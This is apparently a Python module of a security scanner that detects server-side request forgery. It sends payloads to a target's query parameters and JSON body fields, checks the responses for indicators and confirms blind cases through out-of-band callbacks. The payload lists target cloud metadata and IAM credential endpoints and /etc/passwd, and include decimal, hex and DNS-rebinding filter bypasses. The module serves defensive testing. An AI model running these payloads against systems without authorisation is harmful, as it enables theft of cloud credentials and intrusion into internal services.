"""
SSRFModule — YATA RECON module.
Server-Side Request Forgery detection with false-positive-safe indicator checking.
"""
import re
import time
import urllib.parse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from recon.modules import BaseModule


# Signatures that strongly indicate the server fetched an internal/metadata URL
# or read a local file — used as a broad catch-all for the filter-bypass probes
# below, which target hosts we can't predict the exact response shape of.
METADATA_SIGNATURES = [
    "ami-id", "instance-id", "iam/security-credentials", "accountid",
    "computeMetadata", "kube-env", "root:x:0:", "oauth2/token",
    "access_token", "ssh-rsa", "metadata.google", "securityCredentials",
]

# Core SSRF targets plus common filter-bypass variants.
SSRF_PAYLOADS = [
    # AWS / GCP / Azure metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Localhost variants / internal
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "file:///etc/passwd",
    # Bypass variants — filters that literally block "169.254.169.254" or
    # "127.0.0.1" as strings routinely miss these.
    "http://2130706433/",                  # decimal IP for 127.0.0.1
    "http://0x7f000001/",                  # hex IP for 127.0.0.1
    "http://127.0.0.1.nip.io/",            # DNS that resolves to localhost
    "http://2852039166/latest/meta-data/", # decimal IP for 169.254.169.254
    "http://0xA9FEA9FE/latest/meta-data/", # hex IP for 169.254.169.254
    "http://169.254.169.254.nip.io/latest/meta-data/",
]

SSRF_PARAMS = ["url", "redirect", "next", "return", "callback", "fetch",
               "load", "link", "src", "uri", "path", "target", "dest",
               "destination", "image", "img", "proxy", "feed", "host", "site",
               "html", "val", "data", "domain", "webhook", "avatar", "file",
               "endpoint", "resource", "out", "view", "window"]

# Params most likely to carry a JSON-body SSRF sink (webhook/callback/image
# fetch features are almost always delivered as JSON in modern APIs, not
# query strings — a module that only tests query strings misses these).
SSRF_JSON_PROP_HINTS = ["url", "callback", "webhook", "redirect", "image",
                         "avatar", "src", "link", "uri", "endpoint", "target",
                         "host", "site", "proxy", "fetch", "file", "path"]


class SSRFModule(BaseModule):
    NAME = "SSRF"

    def run(self):
        self.ui.section("SSRF — Server-Side Request Forgery Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        s = self._session()
        found = 0

        # Get a baseline response to compare against, so a signature that's
        # simply always present on the page (e.g. the literal word
        # "access_token" in a login form) doesn't get misread as SSRF.
        baseline_resp = None
        try:
            baseline_resp = s.get(self.base_url, timeout=self.timeout)
        except Exception:
            pass
        baseline_text = baseline_resp.text if baseline_resp is not None else ""

        found += self._test_query_params(s, baseline_text)
        found += self._test_json_bodies(s, baseline_text)
        found += self._test_oob(s)

        if found == 0:
            self.ui.info("No SSRF vulnerabilities detected.")

    # ─────────────────────────────────────────────────────────────────────────
    def _build_tests(self):
        """
        Structured (payload, name, indicators) tests. Each payload's indicator
        list is a set of strings that should appear in a genuine response to
        THAT payload but are never substrings of the payload URL itself, so
        Validator.validate_ssrf_indicator can safely reject "we just reflected
        our own injected URL back" false positives.
        """
        tests = [
            {
                "payload": "http://169.254.169.254/latest/meta-data/",
                "name": "AWS EC2 Metadata",
                "indicators": ["ami-id", "instance-id", "local-hostname", "public-hostname",
                               "security-credentials", "instance-type", "availability-zone"],
            },
            {
                "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "name": "AWS IAM Credentials",
                "indicators": ["AccessKeyId", "SecretAccessKey", "Token"],
            },
            {
                "payload": "http://metadata.google.internal/computeMetadata/v1/instance/",
                "name": "GCP Metadata",
                "indicators": ["machineType", "zone/", "serviceAccounts", "network-interfaces"],
            },
            {
                "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "name": "Azure IMDS",
                "indicators": ["vmId", "subscriptionId", "resourceGroupName"],
            },
            {
                "payload": "file:///etc/passwd",
                "name": "Local File Read (file://)",
                "indicators": ["root:x:0:", "bin:x:1:1:", "daemon:x:"],
            },
        ]
        # Filter-bypass variants: same broad indicator set for all of them,
        # since we can't predict the exact shape of whatever internal service
        # they land on — any of these strings showing up is suspicious enough
        # to report, and validate_ssrf_indicator still guards against the
        # indicator being nothing but our own reflected payload.
        bypass_payloads = [
            ("http://127.0.0.1/", "Localhost (loopback)"),
            ("http://localhost/", "Localhost (hostname)"),
            ("http://[::1]/", "Localhost (IPv6)"),
            ("http://2130706433/", "Localhost (decimal IP bypass)"),
            ("http://0x7f000001/", "Localhost (hex IP bypass)"),
            ("http://127.0.0.1.nip.io/", "Localhost (DNS rebinding bypass)"),
            ("http://2852039166/latest/meta-data/", "AWS Metadata (decimal IP bypass)"),
            ("http://0xA9FEA9FE/latest/meta-data/", "AWS Metadata (hex IP bypass)"),
            ("http://169.254.169.254.nip.io/latest/meta-data/", "AWS Metadata (DNS rebinding bypass)"),
        ]
        for payload, name in bypass_payloads:
            tests.append({"payload": payload, "name": name, "indicators": METADATA_SIGNATURES})
        return tests

    # ─────────────────────────────────────────────────────────────────────────
    def _report(self, param, param_type, url, test, indicator):
        self.db.add(
            title=f"SSRF via '{param}' {param_type} — {test['name']} Accessible",
            severity="critical", url=url, module=self.NAME,
            description=(
                f"The '{param}' {param_type} makes the server fetch arbitrary URLs. "
                f"{test['name']} endpoint returned indicator '{indicator}'. "
                "An attacker can access cloud credentials and internal services."
            ),
            remediation=(
                "Whitelist allowed URL schemes and destinations. Block access to "
                "RFC1918 and cloud metadata IP ranges at the network level. "
                "Disable URL fetch functionality if not needed."
            ),
            cvss="9.1",
            confidence="CONFIRMED",
            confidence_score=95,
            validation_steps=["indicator_not_in_payload_url", "indicator_not_in_baseline", "validator_confirmed"],
            evidence=[f"Payload: {test['payload']}", f"Indicator: {indicator}"],
        )
        self.ui.find("critical", f"SSRF — {test['name']} via '{param}'", url)

    def _check_response(self, resp, test, baseline_text):
        """Returns the confirmed indicator string, or None."""
        if resp is None:
            return None
        for indicator in test["indicators"]:
            if indicator not in resp.text:
                continue
            if not self.validator.validate_ssrf_indicator(indicator, test["payload"], resp.text):
                continue
            if indicator in baseline_text:
                continue  # Already present on the page without SSRF — FP
            return indicator
        return None

    # ─────────────────────────────────────────────────────────────────────────
    def _test_query_params(self, s, baseline_text):
        found = 0
        tests = self._build_tests()

        for param in SSRF_PARAMS:
            for test in tests:
                url = f"{self.base_url}?{param}={urllib.parse.quote(test['payload'])}"
                try:
                    resp = s.get(url, timeout=self.timeout)
                except Exception:
                    continue

                indicator = self._check_response(resp, test, baseline_text)
                if indicator:
                    self._report(param, "parameter", self.base_url, test, indicator)
                    found += 1
                    break  # One confirmed indicator is enough for this param

                time.sleep(self.delay)

            if found > 10:
                break
        return found

    def _test_json_bodies(self, s, baseline_text):
        """
        Test JSON request-body properties discovered from an OpenAPI/Swagger
        spec (modules/recon.py). SSRF sinks (webhooks, callback URLs, image
        fetchers) on JSON-only APIs are invisible to query-string-only testing.
        """
        api_endpoints = self.ctx.get("api_endpoints", [])
        if not api_endpoints:
            return 0

        auth_headers = self.ctx.get("auth_headers", {})
        found = 0
        tests = self._build_tests()

        for ep in api_endpoints:
            method = ep.get("method", "POST")
            if method not in ("POST", "PUT", "PATCH"):
                continue
            json_props = ep.get("json_props", [])
            if not json_props:
                continue

            headers = dict(auth_headers)
            for name, example in ep.get("header_params", []):
                if example:
                    headers[name] = str(example)

            candidate_props = [p for p in json_props
                                if any(hint in p.lower() for hint in SSRF_JSON_PROP_HINTS)]
            if not candidate_props:
                continue

            for prop in candidate_props:
                for test in tests[:6]:  # cap per-prop cost — full cloud/localhost/bypass set is expensive over N props
                    body = {p: "test" for p in json_props if p != prop}
                    body[prop] = test["payload"]
                    try:
                        resp = s.request(method, ep["url"], json=body, timeout=self.timeout, headers=headers)
                    except Exception:
                        continue

                    indicator = self._check_response(resp, test, baseline_text)
                    if indicator:
                        self._report(prop, "JSON body property", ep["url"], test, indicator)
                        found += 1
                        break

                    time.sleep(self.delay)
                if found > 10:
                    return found
        return found

    # ─────────────────────────────────────────────────────────────────────────
    def _test_oob(self, s):
        """
        Blind/out-of-band SSRF confirmation via interactsh-client.

        Every check above is in-band: it only catches SSRF into a sink that
        reflects something recognizable back in the HTTP response. A sink
        that fetches the URL and discards the result (webhook validators,
        async image-fetch workers, "ping this URL" health checks) is
        completely invisible to that approach — there's nothing to grep for.
        Here we instead hand the target a URL under an interactsh domain we
        control; if our interaction server later receives a DNS/HTTP hit
        correlated to a specific probe's random label, the target
        definitely made that outbound request. No response inspection
        needed — this is proof, not inference, which is why it's reported
        as CONFIRMED even where the in-band checks above could only ever
        reach HIGH/MEDIUM.
        """
        from recon.core.oast import OASTClient

        oast = OASTClient(self.ui)
        if not oast.available:
            self.ui.info("interactsh-client not installed — skipping blind/OOB SSRF confirmation "
                          "(in-band checks above still ran).")
            return 0

        self.ui.info("Starting interactsh session for blind/OOB SSRF confirmation...")
        if not oast.start():
            self.ui.warn("Could not establish an interactsh session — skipping OOB SSRF confirmation.")
            return 0
        self.ui.ok(f"OOB session ready: *.{oast.domain}")

        probes = {}  # label -> (param, param_type, url_tested)

        try:
            # Query-string params — one OOB probe per candidate param name.
            # Capped well below the in-band param list: each probe is a real
            # outbound request PLUS shares one collective OOB wait window,
            # so testing all ~30 SSRF_PARAMS here would mostly just make the
            # module slower without meaningfully raising detection odds.
            for param in SSRF_PARAMS[:15]:
                label, oob_url = oast.label_url()
                url = f"{self.base_url}?{param}={urllib.parse.quote(oob_url)}"
                try:
                    s.get(url, timeout=self.timeout)
                except Exception:
                    pass
                probes[label] = (param, "parameter", url)
                time.sleep(self.delay)

            # JSON body properties from a discovered OpenAPI spec, same
            # candidate-selection logic as _test_json_bodies.
            api_endpoints = self.ctx.get("api_endpoints", [])
            auth_headers = self.ctx.get("auth_headers", {})
            probed_json = 0
            for ep in api_endpoints:
                if probed_json >= 10:
                    break
                method = ep.get("method", "POST")
                if method not in ("POST", "PUT", "PATCH"):
                    continue
                json_props = ep.get("json_props", [])
                candidate_props = [p for p in json_props
                                    if any(hint in p.lower() for hint in SSRF_JSON_PROP_HINTS)]
                if not candidate_props:
                    continue
                headers = dict(auth_headers)
                for name, example in ep.get("header_params", []):
                    if example:
                        headers[name] = str(example)
                for prop in candidate_props:
                    if probed_json >= 10:
                        break
                    label, oob_url = oast.label_url()
                    body = {p: "test" for p in json_props if p != prop}
                    body[prop] = oob_url
                    try:
                        s.request(method, ep["url"], json=body, timeout=self.timeout, headers=headers)
                    except Exception:
                        pass
                    probes[label] = (prop, "JSON body property", ep["url"])
                    probed_json += 1
                    time.sleep(self.delay)

            if not probes:
                return 0

            self.ui.info(f"Sent {len(probes)} OOB probe(s) — waiting for callbacks...")
            interactions = oast.poll(wait=15.0)
        finally:
            oast.stop()

        found = 0
        reported_labels = set()
        for interaction in interactions:
            label = oast.interaction_label(interaction)
            if not label or label not in probes or label in reported_labels:
                continue
            reported_labels.add(label)
            param, param_type, url = probes[label]
            protocol = interaction.get("protocol", "dns/http")
            self.db.add(
                title=f"Blind SSRF (OOB-Confirmed) via '{param}' {param_type}",
                severity="critical", url=url, module=self.NAME,
                description=(
                    f"The '{param}' {param_type} caused the server to make an outbound "
                    f"{protocol} request to an interactsh domain we control — an out-of-band "
                    "callback we received directly, independent of anything in the HTTP "
                    "response. This proves the server fetches attacker-controlled URLs even "
                    "where the response gives no indication of it (fire-and-forget webhook "
                    "validators, async fetch workers, etc.)."
                ),
                remediation=(
                    "Whitelist allowed URL schemes and destinations server-side. Block "
                    "outbound requests to RFC1918/link-local ranges and cloud metadata IPs "
                    "at the network level, regardless of what the response shows the caller."
                ),
                cvss="9.4",
                confidence="CONFIRMED",
                confidence_score=99,
                validation_steps=["oob_probe_sent", "interaction_received", "label_correlated"],
                evidence=[f"Protocol: {protocol}",
                          f"Remote: {interaction.get('remote-address', interaction.get('remote_address', 'n/a'))}"],
            )
            self.ui.find("critical", f"Blind SSRF (OOB-confirmed) via '{param}'", url)
            found += 1

        if found == 0:
            self.ui.info("No OOB SSRF callbacks received.")
        return found
